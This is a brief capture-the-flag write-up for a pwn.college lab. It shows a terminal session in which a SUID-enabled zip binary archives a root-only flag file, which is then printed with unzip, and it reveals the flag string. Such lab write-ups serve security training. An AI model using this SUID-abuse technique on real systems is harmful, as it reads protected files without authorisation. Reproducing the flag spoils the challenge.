```bash
hacker@program-misuse-level-19:/$ cd challenge/
hacker@program-misuse-level-19:/challenge$ ls
babysuid_level19
hacker@program-misuse-level-19:/challenge$ ./babysuid_level19 
Welcome to ./babysuid_level19!

This challenge is part of a series of programs that
force you to understand different archive formats.

I just set the SUID bit on /usr/bin/zip.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level19) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/zip!
hacker@program-misuse-level-19:/challenge$ cd ..
hacker@program-misuse-level-19:/$ zip flag.zip flag 
  adding: flag (stored 0%)
hacker@program-misuse-level-19:/$ ls
bin  boot  challenge  dev  etc  flag  flag.zip  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse-level-19:/$ unzip -l flag.zip 
Archive:  flag.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       57  2023-12-31 05:51   flag
---------                     -------
       57                     1 file
hacker@program-misuse-level-19:/$ ls
bin  boot  challenge  dev  etc  flag  flag.zip  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse-level-19:/$ ls -l flag
-r-------- 1 root root 57 Dec 31 05:51 flag
hacker@program-misuse-level-19:/$ unzip -c flag.zip 
Archive:  flag.zip
 extracting: flag                    
pwn.college{0PJaeYYSa_cp_QrTYcNM8aJAxFb.0VM2EDL0AjNzQzW}
```

After compressing the 'flag' file, we decompress the flag.zip file.

`unzip -c flag.zip`

This will print the contents of the flag.zip.